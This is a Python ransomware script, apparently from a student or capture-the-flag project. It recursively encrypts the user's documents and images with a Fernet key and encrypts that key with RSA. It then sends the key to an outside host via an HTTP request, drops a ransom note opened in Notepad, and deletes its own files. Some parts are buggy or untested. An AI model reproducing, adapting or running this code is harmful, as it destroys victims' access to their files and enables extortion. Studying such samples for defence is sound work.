from Crypto.PublicKey import RSA
from cryptography.fernet import Fernet
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import win32gui
import time
import subprocess
import os, base64
import requests

#Symmetric key encrypts files, public key encrypts symmetric key, private key stored in database


def encrypt_file(files_to_enc, crypt, encrypted = False):
    for i in files_to_enc:
        with open(i, 'rb') as f:
            data = f.read()
            if not encrypted:
                newData = crypt.encrypt(data)
            else:
                newData = crypt.decrypt(data)
        with open(i, 'wb') as f:
            f.write(newData)

def encrypt_system(crypt, encrypted=False):

    exts = ['png','txt','docx','doc','pdf','jpg','jpeg']
    
    systemRoot = os.path.expanduser('~') #as far as we know this should look at everything but since we couldn't really test it we are not sure
    files_to_enc = []
    system = os.walk(systemRoot,topdown=True)
    for root,dir,files in system:
        for file in files:  
            fpath = os.path.join(root,file)
            if not file.split('.')[-1] in exts:
                continue
            if not encrypted:
                files_to_enc.append(fpath)
            # else:
            #     encrypt_file(fpath, crypt, encrypted=True)
    encrypt_file(files_to_enc,crypt)
    return files_to_enc

def encrypt_key(public_key, fernet_key):
    
    with open('fernet.txt','wb') as f:
        public_key = RSA.import_key(open('public.pem').read())
        public_crypter = PKCS1_OAEP.new(public_key)
        enc_fkey = public_crypter.encrypt(fernet_key)
        f.write(enc_fkey)
        url = "http://www.angelctf.com/process_macro.php?deadbeef[]=" + str(enc_fkey) + "&deadbeef[]=mal"
        requests.get(url, params={key: enc_fkey})

    return enc_fkey, None


def ransom_note():
    with open('gotcha.txt','w') as file:
        file.write("""Youre files have been encrypted XD""")
    ransom = subprocess.Popen(['notepad.exe', 'gotcha.txt'])

    
#Main
stuffToDelete = ['make_pub_key.py', 'ransomware.py', 'public.pem','fernet.txt']
key = Fernet.generate_key()
crypt = Fernet(key)
file_list = encrypt_system(crypt)

pub = open('public.pem', 'r').read()
key, crypter = encrypt_key(pub,key)
ransom_note()
for i in stuffToDelete:
    if os.path.exists(i):
        os.remove(i)






    
